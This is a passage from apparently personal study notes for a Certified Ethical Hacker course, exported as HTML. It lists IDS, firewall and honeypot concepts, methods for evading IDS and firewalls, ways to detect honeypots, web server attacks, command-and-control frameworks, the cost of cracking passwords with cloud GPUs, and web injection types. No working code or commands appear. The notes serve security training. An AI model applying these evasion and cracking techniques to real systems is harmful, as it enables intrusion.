src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2044.png"/></a></figure></details></li></ul><ul id="ba63ef2e-f841-4d44-9e8a-9d80cbc6681c" class="toggle"><li><details open=""><summary>Technologies used</summary><figure id="adb994e2-3910-4e15-83e8-8758f10f206f" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2045.png"><img style="width:779.6022338867188px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2045.png"/></a></figure></details></li></ul><ul id="4dd11130-cecf-48a1-b51a-f42b481bb15d" class="bulleted-list"><li style="list-style-type:circle">WAFs: Imperva is the best, modsecurity, cloudflare</li></ul></li></ul><ul id="f77b8da8-e7a0-4f14-af9e-7873363c79ce" class="bulleted-list"><li style="list-style-type:disc">DMZ: a network that serves as a buffer between internal secure net and insecure net</li></ul><ul id="60bcbd2f-8323-4625-b25b-7897564771ff" class="bulleted-list"><li style="list-style-type:disc">Honeypot<ul id="af4ef10b-1685-4b8d-80c2-0f675a239af1" class="bulleted-list"><li style="list-style-type:circle">set up to attract and trap people who attempt to penetrate a network</li></ul><ul id="1130dbe5-411e-4b94-b8cd-1c83b4798f57" class="bulleted-list"><li style="list-style-type:circle">mostly created by simulating a realistic system <ul id="fbeb99a3-1b36-4424-b0c3-94a999545c42" class="bulleted-list"><li style="list-style-type:square">not being open to all services because automated bots will cause too much traffic if public</li></ul></li></ul><ul id="4b22b766-b2b6-4182-8762-1af7c494abeb" class="bulleted-list"><li style="list-style-type:circle">most common is kfsensor</li></ul></li></ul><h3 id="1bf1fbcf-fbc3-4599-ad81-c70008420c91" class="">Demonstrate Solutions</h3><ul id="93a61635-c41c-4431-9d74-61b81e4c4a7b" class="bulleted-list"><li style="list-style-type:disc">Ids using YARA Rules<ul id="5bf4f5dd-1171-4a4f-8de5-4e6a4b6a5527" class="bulleted-list"><li style="list-style-type:circle">yara is a malware research tool<ul id="e8743a63-1a76-434b-a482-cbead861ee57" class="bulleted-list"><li style="list-style-type:square">has predefined way of building tools</li></ul></li></ul><ul id="dd8f5b0f-5cbe-44e6-8a90-10b4b81cfebe" class="bulleted-list"><li style="list-style-type:circle">there are tools to write tools: yara ret, koodus, online tools like yaradbg.dev,</li></ul></li></ul><ul id="b27ee936-c3cf-4e9a-95e9-aceb60f3df7b" class="bulleted-list"><li style="list-style-type:disc">Snort:<ul id="472c9887-0024-4ae2-af80-747f6905de20" class="bulleted-list"><li style="list-style-type:circle">community based, owned by cisco but not in commercial purpose</li></ul><ul id="d1c7382c-9e15-496b-bade-a0f14f061ba9" class="bulleted-list"><li style="list-style-type:circle">diffenrent rule format</li></ul><ul id="84d6c895-2b56-4f15-8f21-0c594f7ae324" class="bulleted-list"><li style="list-style-type:circle">we will have a question in the exam we should know how the rules are constructed</li></ul></li></ul><ul id="6a908b02-1d26-4899-a50a-6da45f1d8535" class="bulleted-list"><li style="list-style-type:disc">Suricata and AlienVault (now called levelblue)</li></ul><ul id="c8866396-ba9f-4096-af7b-35af13c650e8" class="bulleted-list"><li style="list-style-type:disc">Other tools: USM Anywhere (commercial of alienvault), ibm security network ips, cyberoam ips, mcafee host ips for desktops, secure ips (gnips), quantom ips</li></ul><ul id="aac180c6-0c96-4388-a85f-697ffeee2fb6" class="bulleted-list"><li style="list-style-type:disc">Firewalls:<ul id="c918cdf3-0a4e-40d4-84db-ec42f1bf6b7a" class="bulleted-list"><li style="list-style-type:circle">ZoneAlarm (don’t use its monitoring from you)</li></ul><ul id="9ae9638e-677c-4476-8d7b-3b2be3247a61" class="bulleted-list"><li style="list-style-type:circle">pfSense, Comodo, Sophos XG Firewall</li></ul><ul id="de86e41f-1b93-484d-bf5a-e8524f2c0336" class="bulleted-list"><li style="list-style-type:circle">ManageEngine Firewall Analyzer</li></ul></li></ul><ul id="d0f7685f-4b9a-4127-81ca-8ecdf8835241" class="bulleted-list"><li style="list-style-type:disc">Honeypot Tools:<ul id="f6ff068a-50f0-4f79-a53f-8adfad816434" class="bulleted-list"><li style="list-style-type:circle">kfsensor</li></ul><ul id="15604472-5557-4f7e-a0ae-320b418d510f" class="bulleted-list"><li style="list-style-type:circle">google hacking honeypot<ul id="c24f6913-8039-4f38-bdbb-598b9937f864" class="bulleted-list"><li style="list-style-type:square">creates links in your web app that looks valuable (like pass list, php info etc)</li></ul><ul id="c83fcd0c-1e03-44df-9700-39623ee07c21" class="bulleted-list"><li style="list-style-type:square">if someone is on to you he will use google dorks and find these data</li></ul><ul id="b3c7ef6c-a874-4b0a-9092-e657848f31f0" class="bulleted-list"><li style="list-style-type:square">automatically the data will be accessed so you will get an alert for intrusion</li></ul></li></ul><ul id="e06e6f2b-38e1-4d11-9f13-4b26d8522fac" class="bulleted-list"><li style="list-style-type:circle">HoneyBOT</li></ul></li></ul><h3 id="e7f7abcc-1fbd-4762-ab74-66753e4b8485" class="">Demostrate Bypass Evade IDS</h3><ul id="980bd885-a3ab-45bd-9a9d-ed0b714dc289" class="toggle"><li><details open=""><summary>Techniques</summary><figure id="a9dd7873-21a7-4fca-8d1f-155cb7208c18" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2046.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2046.png"/></a></figure></details></li></ul><ul id="a6dbb39c-1f96-415c-864b-efb502db869b" class="bulleted-list"><li style="list-style-type:disc">Insertion attack<ul id="46824432-5c44-4757-af26-cb59f6539c27" class="bulleted-list"><li style="list-style-type:circle">insert invalid packets forcing ids to read them</li></ul></li></ul><ul id="77a8eb9e-3194-4577-be0b-35b79fc96840" class="bulleted-list"><li style="list-style-type:disc">Evasion<ul id="261745a6-d01a-498d-915f-7c0f3260b656" class="bulleted-list"><li style="list-style-type:circle">make system accept a packet that the ids rejects</li></ul></li></ul><ul id="62676bf2-f14f-4cb0-bd54-b88a48f7329f" class="bulleted-list"><li style="list-style-type:disc">Denial of Service:<ul id="626ae702-49d3-422e-a6d9-d5c54a032b0e" class="bulleted-list"><li style="list-style-type:circle">if too much traffic, it might not be able to process it so it might crash</li></ul><ul id="dc7b3f78-8df9-4dfe-adaa-ea44d0f7940d" class="bulleted-list"><li style="list-style-type:circle">when it crashes you will perform the attack</li></ul></li></ul><ul id="74cbaa4e-3f9c-4516-a02e-063dec991673" class="bulleted-list"><li style="list-style-type:disc">Obfuscating:<ul id="fc75a482-d209-4d38-a178-fdd0960af591" class="bulleted-list"><li style="list-style-type:circle">change the signature of the attack packet</li></ul><ul id="99afab6d-ae8b-4c51-9cab-83ab89ead099" class="bulleted-list"><li style="list-style-type:circle">different than encryption, just changing the signsature</li></ul></li></ul><ul id="8f91eb8d-69da-46f2-88b4-f71fbacd3963" class="bulleted-list"><li style="list-style-type:disc">False Positive<ul id="6ba5c046-0d71-408f-9091-781658f4ced8" class="bulleted-list"><li style="list-style-type:circle">generate alot of alarms that will trigger an investigation</li></ul><ul id="ce722108-fcea-4b29-98e8-c800443675b3" class="bulleted-list"><li style="list-style-type:circle">many false positive will exhaust resources</li></ul><ul id="727b317b-19ad-411d-9b98-5e4b892659d0" class="bulleted-list"><li style="list-style-type:circle">most times when they do port scanning, they notice that they have it turned off anyway because they have too much false positive alerts</li></ul></li></ul><ul id="2de838e2-f1bb-4ff4-b9f9-a9d51d0563c6" class="bulleted-list"><li style="list-style-type:disc">Fragmentation Attack<ul id="81999b44-0ada-4782-83df-afb7df04640e" class="bulleted-list"><li style="list-style-type:circle">segment to smaller packets which cannot be giving the full picture of the attack to the ids</li></ul><ul id="a94b7085-d693-47c2-91a6-f4b086063755" class="bulleted-list"><li style="list-style-type:circle">can be done as overlapping fragments that with given offset they are not in the correct order so ids is not able to reconstruct</li></ul><ul id="092b38dd-b4f8-4888-921e-cf1ec9f17ccb" class="bulleted-list"><li style="list-style-type:circle">but at the destination its cabable of reconstructing</li></ul><ul id="0e6698c9-11b6-464c-bd78-2a49b750b02d" class="bulleted-list"><li style="list-style-type:circle">eg. cisco does not reconstruct overlapping fragments but windows xp does</li></ul></li></ul><ul id="fe1cccd9-8d46-4ca2-ad00-2330b767404f" class="bulleted-list"><li style="list-style-type:disc">TTL Attacks<ul id="976894e9-9bad-4a41-b177-7d1af9ff583f" class="bulleted-list"><li style="list-style-type:circle">difficult, almost impossible in modern firewalls</li></ul><ul id="3785f5df-db4a-4bed-b7c3-a28cdd37bb2c" class="bulleted-list"><li style="list-style-type:circle">but its something that you must try because often they have misconfigurations</li></ul></li></ul><ul id="dae0446d-be71-4b14-b6a2-36be82633d6d" class="bulleted-list"><li style="list-style-type:disc">Urgency Flag</li></ul><ul id="c82b047b-b06f-4a87-8eda-9821398951cf" class="bulleted-list"><li style="list-style-type:disc">ASCII Shellcode<ul id="6b515d02-5ba5-4aa9-ba65-8d6a343528fb" class="bulleted-list"><li style="list-style-type:circle">these do not detect attack but suspicious activity</li></ul></li></ul><ul id="b9788a84-41fc-4955-86d0-28f0e29809b3" class="bulleted-list"><li style="list-style-type:disc">Application-Layer Attacks<ul id="c41352d9-48b1-41e6-b5cf-7b6c2c0246ad" class="bulleted-list"><li style="list-style-type:circle">different signature of compressed file format<ul id="d6e25f3d-ee00-4719-8a95-303183703416" class="bulleted-list"><li style="list-style-type:square">maybe with UBX packer</li></ul><ul id="5f0e94f8-7f2d-4fae-8be9-62eef6366cfc" class="bulleted-list"><li style="list-style-type:square">the signature changes so they dont detect with signature based detections</li></ul></li></ul></li></ul><h3 id="dfe73d06-ef6e-49b4-b857-5d8ebc6041e3" class="">Demonstrate Bypass Firewall</h3><ul id="8cee9550-5db7-494d-b66b-11de8af8e8f7" class="toggle"><li><details open=""><summary>Techniques</summary><figure id="16f0c54b-4947-4712-bf0c-e8e6a8985d00" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2047.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2047.png"/></a></figure></details></li></ul><ul id="db9d02cd-3225-492f-a3c6-3b8864526244" class="bulleted-list"><li style="list-style-type:disc">Firewalking (in the exam)<ul id="c3507ee9-60c9-487a-ac0d-c8bfb03dc197" class="bulleted-list"><li style="list-style-type:circle">manipulate ttl</li></ul></li></ul><ul id="9c641dac-feab-41e1-afe0-5214f97e5675" class="bulleted-list"><li style="list-style-type:disc">Bypass url filtering by using ip instead of domain name<ul id="feae654f-e061-447a-9e6c-4287e228b28b" class="bulleted-list"><li style="list-style-type:circle">Use anonymizers (eg. proxies)</li></ul><ul id="3c771efc-349c-4a12-8b00-7e02432fa88a" class="bulleted-list"><li style="list-style-type:circle">Use google translate to open a website (copy paste to google and click it)</li></ul></li></ul><ul id="686e03d4-8f32-45c0-9e4e-5be563d15cc5" class="bulleted-list"><li style="list-style-type:disc">ICMP Tunneling</li></ul><ul id="f047eba9-072d-483e-ad18-902cf78a19f5" class="bulleted-list"><li style="list-style-type:disc">HTTP Tunneling<ul id="e94dd7de-6bcf-433a-b515-cc5b2a57c7e7" class="bulleted-list"><li style="list-style-type:circle">avoid these</li></ul><ul id="d50c537e-f0f5-44f0-8cfe-4f3919e83791" class="bulleted-list"><li style="list-style-type:circle">prefer ssh tunneling tools (use encryption)</li></ul></li></ul><ul id="a6a47f10-0987-4a3c-a553-433c53763f80" class="bulleted-list"><li style="list-style-type:disc">SSH Tunneling: Bitvise and Secure Pipes</li></ul><ul id="eff21897-fd13-4bf2-b8fb-7128a895f479" class="bulleted-list"><li style="list-style-type:disc">DNS Tunneling<ul id="0cf2070d-8dd1-4da1-a610-47b8af9b4337" class="bulleted-list"><li style="list-style-type:circle">important because we use it everywhere</li></ul><ul id="ef69967d-4dbd-4d74-b736-94aa06fea5e1" class="bulleted-list"><li style="list-style-type:circle">a hacker tunneled tcp session inside dns packets</li></ul><ul id="1866670d-7809-4b35-8fd3-2d994532d66e" class="bulleted-list"><li style="list-style-type:circle">used 3rd party dns with real server real zone to use dns packets to encapsulate tcp</li></ul><ul id="b94b2be2-4502-4cc2-bdf0-93dd25092fec" class="bulleted-list"><li style="list-style-type:circle">but speed is low</li></ul><ul id="b81ee91d-5eb0-46e0-ada5-4c256e9662bd" class="bulleted-list"><li style="list-style-type:circle">dns traffic is low in appearance but if you see alot of these will trigger an alarm</li></ul></li></ul><ul id="d81689e3-ab26-41ab-b5ad-56fa85aa412b" class="bulleted-list"><li style="list-style-type:disc">Using External Systems</li></ul><ul id="a30b2a5b-9a25-4b84-a709-f6cf8e5bbeee" class="bulleted-list"><li style="list-style-type:disc">Content hidden within files like macros in office<ul id="780ea6a8-a417-4092-9202-23516e914e1e" class="bulleted-list"><li style="list-style-type:circle">use obfuscation and randomisation in names so that it does not trigger an alert</li></ul><ul id="2dd010af-7a1c-466c-a2d6-32331edaf101" class="bulleted-list"><li style="list-style-type:circle">the script then creates a real attack after it is executed</li></ul></li></ul><ul id="42bac3a3-13b8-44cc-bf17-6e391e88b921" class="bulleted-list"><li style="list-style-type:disc">XSS using ascii and hex encoding<ul id="9178f6f4-9035-4280-a0e0-1b1a7f685377" class="bulleted-list"><li style="list-style-type:circle">but its suspicious unless you use ofbuscation</li></ul><ul id="080c0506-6bbf-4241-b90f-87aa847344ba" class="bulleted-list"><li style="list-style-type:circle">to avoid detection rewrite the code in a way that changes the pattern</li></ul></li></ul><ul id="e8721191-8764-4cbf-87f1-3924a07738f8" class="bulleted-list"><li style="list-style-type:disc">use Background Intelligent Tranfser Service in windows (BITS)</li></ul><h3 id="249bd55c-f613-48fe-880d-37af59bc6a01" class="">Techniques to Bypass Network Access Control and Endpoint Security</h3><ul id="47bfbd98-35d6-4166-9715-7ea33e4cbca4" class="toggle"><li><details open=""><summary>Techniques</summary><figure id="0d4d1dc2-24c3-4a60-a51f-65fd497c96c4" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2048.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2048.png"/></a></figure></details></li></ul><ul id="bd35199a-2de4-4e00-9abf-1816cd60430f" class="bulleted-list"><li style="list-style-type:disc">Ghostwriting</li></ul><ul id="175fce6e-3cf5-43c9-9971-6370f3252465" class="bulleted-list"><li style="list-style-type:disc">Application Whitelisting<ul id="3d56ae47-1642-4de3-9073-90102162d586" class="bulleted-list"><li style="list-style-type:circle">use known binaries that are whitelisted</li></ul><ul id="3ca056c4-65ab-4c0f-81d7-1d989b97258f" class="bulleted-list"><li style="list-style-type:circle">inject in these your code so that you can execute commands as the identity of that app</li></ul><ul id="b32bc28b-a557-4bf5-bf6a-04eb2a9807ed" class="bulleted-list"><li style="list-style-type:circle">you must explicitly define what are the applications that are whitelisted and allowed to execute</li></ul></li></ul><ul id="6b4662ce-6aed-49bf-b0fa-905bfe14528c" class="bulleted-list"><li style="list-style-type:disc">Clearing Memory Hooks</li></ul><p id="0e8553ce-64c6-4e59-92dc-6027cb3d397d" class="">
</p><h3 id="46beacc5-4acd-4c8f-91c5-2d0067777853" class="">Evading tools</h3><ul id="1ff30c02-0f52-4f5b-81db-97ad161ea86c" class="bulleted-list"><li style="list-style-type:disc">nmap, metasploit, inudator, ids-evasion, hyperion</li></ul><ul id="fbb0058e-bf18-44bc-a2c8-8e5270dc875f" class="bulleted-list"><li style="list-style-type:disc">nmap scripts detect honeypots</li></ul><h3 id="dd7e3fcb-04cc-452c-a60d-e5dc67c0e0a8" class="">Techniques to Detect Honeypots</h3><ul id="c7a7774b-f0bf-4c30-8f71-9a26be04aff1" class="bulleted-list"><li style="list-style-type:disc">honeypot detection tools<ul id="bacdb7a1-fe03-4869-8a16-e7ecbe4920c8" class="bulleted-list"><li style="list-style-type:circle">kippo_detect</li></ul><ul id="3034b2f0-039a-4fca-a61f-ec52b61e419f" class="bulleted-list"><li style="list-style-type:circle">send-safe honeypot hunter (good one)<ul id="e203f523-b0ad-424f-a0dd-aa6b59d5f36d" class="bulleted-list"><li style="list-style-type:square">you don’t need to manually check, you can use these tools</li></ul></li></ul><ul id="397fc24c-424c-4dc1-bcb0-0a47f8a57d04" class="bulleted-list"><li style="list-style-type:circle">if you see behind an ip that you see multiple systems kali, microsoft, parrot etc</li></ul><ul id="e8708bb7-b5b7-47e1-a7f6-e1085f38d51d" class="bulleted-list"><li style="list-style-type:circle">most of honeypots simulate a vulnerability you cannot exploit<ul id="3f145608-fd9e-42d5-90a5-ed024c4e60b9" class="bulleted-list"><li style="list-style-type:square">so its a way to identify if there is a honeypot or not</li></ul></li></ul></li></ul><h3 id="e2a93530-2da1-4324-a914-94fb85a948b2" class="">Countermeasures</h3><ul id="2b20a5e9-72b3-4288-bf1c-ffe46024b23d" class="toggle"><li><details open=""><summary>Defend against Evasion</summary><figure id="5edca72e-59f4-49af-8579-c6b16f44599c" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2049.png"><img style="width:807.5994262695312px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2049.png"/></a></figure></details></li></ul><p id="6a6a142d-35a9-4911-b91f-b39d330d2010" class="">
</p></details></li></ul><ul id="73579fc5-e174-4577-ae5e-ccd847e436b1" class="toggle"><li><details open=""><summary>Module 13 - Hacking Web Servers</summary><h3 id="65116d7e-56ac-44cb-9fe9-6728b6c02034" class="">Summarize Web Server Concepts</h3><figure id="805a2c13-90ea-4cee-b64d-6d2865bdb1ae" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2050.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2050.png"/></a></figure><h3 id="128da4ff-45f7-4520-b254-59c6faa06100" class="">Demonstrate Different Web Server Attacks</h3><ul id="f39c1389-34a9-4906-acf4-60fba1fe9dd5" class="bulleted-list"><li style="list-style-type:disc">directory traversal attack</li></ul><ul id="4ffbec23-dcb2-4967-9f98-05295aa3db2b" class="bulleted-list"><li style="list-style-type:disc">dns server hijacking</li></ul><ul id="0279ff93-b0d2-41fd-8a2c-d70691ac758e" class="bulleted-list"><li style="list-style-type:disc">dns amplification</li></ul><ul id="7e94cedf-bfde-412f-a453-a3627153b1e6" class="bulleted-list"><li style="list-style-type:disc">website defancement<ul id="015a876b-241e-41ce-8a2b-533e403bd461" class="bulleted-list"><li style="list-style-type:circle">when someone unauthorized changes the contents of a website</li></ul><ul id="403b32da-cf1d-4fe8-aa72-e41aa08a2c64" class="bulleted-list"><li style="list-style-type:circle"><a href="http://zone-h.org">zone-h.org</a> - shows all the pages that were defaced<ul id="67b43e19-1e1a-4b36-ab8a-202cc881d15a" class="bulleted-list"><li style="list-style-type:square">but clicking on seeing it might run code that they put</li></ul><ul id="35f90677-fd53-47c2-be6f-5c726d89cbcb" class="bulleted-list"><li style="list-style-type:square">also has an archive</li></ul></li></ul></li></ul><ul id="ddc29803-946f-437f-8c6b-a802df296933" class="bulleted-list"><li style="list-style-type:disc">web server misconfiguration<ul id="d47c88c8-8c67-4e50-89ca-daf4883ee0da" class="bulleted-list"><li style="list-style-type:circle">apache shows errors if enabled</li></ul><ul id="27a36293-4978-402c-be9c-5263eb3bb80a" class="bulleted-list"><li style="list-style-type:circle">display_error=on in php files</li></ul><ul id="b0083d88-4c95-4b0d-9c89-4b7c959814ec" class="bulleted-list"><li style="list-style-type:circle">errors can show paths of files</li></ul></li></ul><ul id="f61691bd-0398-4baa-8494-b94840ee4eb9" class="bulleted-list"><li style="list-style-type:disc">HTTP Response Splitting Attack<ul id="73dae59f-80b1-4286-8bb0-f6ba39b3f66a" class="bulleted-list"><li style="list-style-type:circle">most of the times its detected by the scanner</li></ul><ul id="50f0f82d-3cb8-4827-93df-e626da768048" class="bulleted-list"><li style="list-style-type:circle">but so far they havent detected it</li></ul></li></ul><ul id="0cafbaef-77ff-49b7-b9b7-4dfcf22bbaff" class="bulleted-list"><li style="list-style-type:disc">SSH Brute Force<ul id="5eff4b81-8b60-48a6-af55-c41ec0b9c0a8" class="bulleted-list"><li style="list-style-type:circle">if it uses username and password</li></ul></li></ul><ul id="83ecf31d-73dd-431b-9d77-601d4ae491d3" class="bulleted-list"><li style="list-style-type:disc">Web Server Password Cracking</li></ul><p id="299d14ea-175f-45ca-8a47-def892cb7a5e" class="">
</p><h3 id="ad773d7b-1d74-4e2b-9f02-bd3177c16e72" class="">Explain Web Server Attack Methodology</h3><figure id="6b54be35-4059-4b78-8482-418acadeb5e0" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2051.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2051.png"/></a></figure><ul id="b1b406d3-faf8-433b-8ff9-5f28cb27a523" class="bulleted-list"><li style="list-style-type:disc">robots.txt</li></ul><ul id="bc2e0b99-6ad2-468f-9202-9ab2c34606fd" class="bulleted-list"><li style="list-style-type:disc">directory listing</li></ul><ul id="fbf61183-51bd-4f42-95e9-133955e95dd4" class="bulleted-list"><li style="list-style-type:disc">password cracking, hashcat, thchytdra, ncrack<ul id="bd858fe2-efc3-4cc2-a2a7-17328f425761" class="bulleted-list"><li style="list-style-type:circle">hashcat azure script (github) allows the use of it in azure nv-series which allows gpu (but sometimes not available)</li></ul><ul id="71506afd-38d9-4d76-ae41-fb27c90434fd" class="bulleted-list"><li style="list-style-type:circle">you can use free 100 dollars<ul id="64312d41-6e43-4c28-b4f8-6d8c3cc33971" class="bulleted-list"><li style="list-style-type:square">10 characters full complexity takes 15$ to crack</li></ul><ul id="a781a8a3-cfd5-4009-aa6e-c9b72ca83c4a" class="bulleted-list"><li style="list-style-type:square">10 minutes</li></ul></li></ul><ul id="d05e860e-600a-422a-9835-01042816e60d" class="bulleted-list"><li style="list-style-type:circle">you can also go to google cloud and select NVIDIA T4 with 4 gpu per virtual machine<ul id="c3f19105-ed1e-4500-8c27-8718104510b8" class="bulleted-list"><li style="list-style-type:square">also around 15-20 dollars</li></ul></li></ul><ul id="5ff66028-e5ef-4e5f-8d58-c6f9f3ef9869" class="bulleted-list"><li style="list-style-type:circle">but with complex password with 20 characters even with 3 million euros you wont crack it</li></ul></li></ul><ul id="a837dcba-8d35-4a27-82ab-980094ecfd9e" class="bulleted-list"><li style="list-style-type:disc">metasploit as web server attack tool</li></ul><ul id="e2bed9b2-5828-4ff3-a7aa-9776f682130b" class="bulleted-list"><li style="list-style-type:disc">other web attack tools<ul id="6f2df1d6-c6c9-4d46-bb73-c7b3e77549f8" class="bulleted-list"><li style="list-style-type:circle">thc hydra, hulk dos, mpack, w3af</li></ul></li></ul><p id="473860c6-3d6f-40e3-9b12-f0ff0570f80b" class="">
</p><p id="12b755a1-9646-4a4b-814f-da12d6670a42" class="">C&amp;c tools:<div class="indented"><ul id="c001df46-9e78-4021-b4e8-52e11924847d" class="bulleted-list"><li style="list-style-type:disc">immunity canvas has c&amp;c system<ul id="d3c4ebfe-cfe3-4879-82b1-7118cdd6df24" class="bulleted-list"><li style="list-style-type:circle">can be used with d2 exploit pack</li></ul></li></ul><ul id="0fe55e80-ced5-4fc0-b542-3c5824663ed8" class="bulleted-list"><li style="list-style-type:disc">exploit pack is one of the best attacking platform has c2 control pack for command and control </li></ul><ul id="649ccfa8-9b8b-4836-ade3-2c8b127a176d" class="bulleted-list"><li style="list-style-type:disc">Cobalt Strike (leaked source code), <a href="https://github.com/BishopFox/sliver">Sliver</a>, Mythic, Covenant</li></ul><ul id="5fdced04-41b1-40f3-9206-d7d275ac18d6" class="bulleted-list"><li style="list-style-type:disc">but most of these have their signatures recongised so you have to change their code</li></ul></div></p><h3 id="846a70f7-6b2c-416a-991f-ad5e9b489d01" class="">Explain Web Server Attack Countermeasures</h3><ul id="b1bbd159-ad82-4d68-891a-6d6e18a9d175" class="toggle"><li><details open=""><summary>Patches and Updates</summary><figure id="5fcc2639-1206-4e22-866e-991ea637ca54" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2052.png"><img style="width:382px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2052.png"/></a></figure></details></li></ul><ul id="8c378f83-c69d-4e6e-bfdc-5691cc70bfab" class="toggle"><li><details open=""><summary>Protocols and Accounts</summary><figure id="a752ef5a-bc8d-4872-894c-775168ba9b4a" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2053.png"><img style="width:807.6278076171875px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2053.png"/></a></figure></details></li></ul><ul id="ae08be18-18fa-4433-b999-9a8c6b56245f" class="toggle"><li><details open=""><summary>Files and Directories</summary><figure id="ea83edfb-03be-4c9a-a677-09fa29f3c701" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2054.png"><img style="width:807.6278076171875px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2054.png"/></a></figure></details></li></ul><ul id="f7996abc-68c3-4dbc-af88-263f9452aed9" class="toggle"><li><details open=""><summary>Defend Against Web Attacks</summary><figure id="a6981bc0-1b13-42b8-816b-85cb4618b81c" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2055.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2055.png"/></a></figure><figure id="83ced989-85ee-4a26-bbd2-ffd81f489972" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2056.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2056.png"/></a></figure></details></li></ul><ul id="f2170d90-3ba2-4f45-90d5-d2c0afd096ab" class="bulleted-list"><li style="list-style-type:disc">Tools<ul id="d3086816-161a-4475-b276-6e13c19ab28e" class="bulleted-list"><li style="list-style-type:circle">syhunt hybrid, n-stalker x, syhunt hybrid, qualys community edition, nikto2, immuniweb, web vulnerability scanner from pentest-tools, wordpresss security scan, observatory</li></ul></li></ul><h3 id="320f5a22-c699-4446-99a5-f6d22e0bb1ed" class="">Summarize Patch Management Concepts<br/><br/></h3><p id="5504305e-8d87-46a9-bc09-f0ce5f6b8946" class="">
</p></details></li></ul><ul id="92f7da3f-0288-4548-9fd5-aff7265011b0" class="toggle"><li><details open=""><summary>Module 14 - Hacking Web Applications</summary><figure class="callout" style="white-space:pre-wrap;display:flex" id="31a9eb51-0ecf-452b-b93e-7caad32467aa"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Havent paid so much attention here, should study again</div></figure><h3 id="4cb4317e-3252-4902-ba6a-c61f0709f306" class="">Summarize Web Application Concepts</h3><p id="3604b784-b3fd-429d-ada0-81459282f34c" class="">
</p><h3 id="6a279079-ea14-44a6-bfcf-2c31fa90bb67" class="">Demonstrate Web Application Threats</h3><ul id="de967b3d-6900-4a6f-87b5-196f73833409" class="bulleted-list"><li style="list-style-type:disc">LDAP Injection</li></ul><ul id="716393ac-2a72-44ca-8565-fe75d47e9790" class="bulleted-list"><li style="list-style-type:disc">SQL Injection</li></ul><ul id="cdd73729-816f-4ed1-96ef-323bca330863" class="bulleted-list"><li style="list-style-type:disc">Log Injection</li></ul><ul id="497f9112-e9d7-4418-b256-948954217282" class="bulleted-list"><li style="list-style-type:disc">Server-Side Includes Injection</li></ul><ul id="18f6916f-dd8a-46fd-a8c3-97b238e06460" class="bulleted-list"><li style="list-style-type:disc">Server-Side Template Injection</li></ul><ul id="a1e541d9-0493-430f-a064-0d212b812adb" class="bulleted-list"><li style="list-style-type:disc">HTML Injection</li></ul><ul id="8a715628-a7f3-47a8-9dba-d6ef09f80fd2" class="bulleted-list"><li style="list-style-type:disc">CRLF Injection</li></ul><ul id="67e20366-222a-433f-b983-57c20c9f430f" class="bulleted-list"><li style="list-style-type:disc">JNDI Injection</li></ul><ul id="14a2c386-5960-4068-855d-bba6c3759abf" class="bulleted-list"><li style="list-style-type:disc">XML External Entity</li></ul><ul id="6395e93c-69e2-4ece-b92d-8deadf3e8b64" class="bulleted-list"><li style="list-style-type:disc">OWASP Top 10<ul id="00951a4f-47b4-4430-b608-8277445cd863" class="bulleted-list"><li style="list-style-type:circle">SSRF in Exchange OWA (microsoft exchange)</li></ul><ul id="20ecd938-0be9-4550-88ad-6769973df665" class="bulleted-list"><li style="list-style-type:circle">XSPA - Cross Site Port Attack</li></ul></li></ul><ul id="94ef61bf-cc64-415e-97d8-d2952109653d" 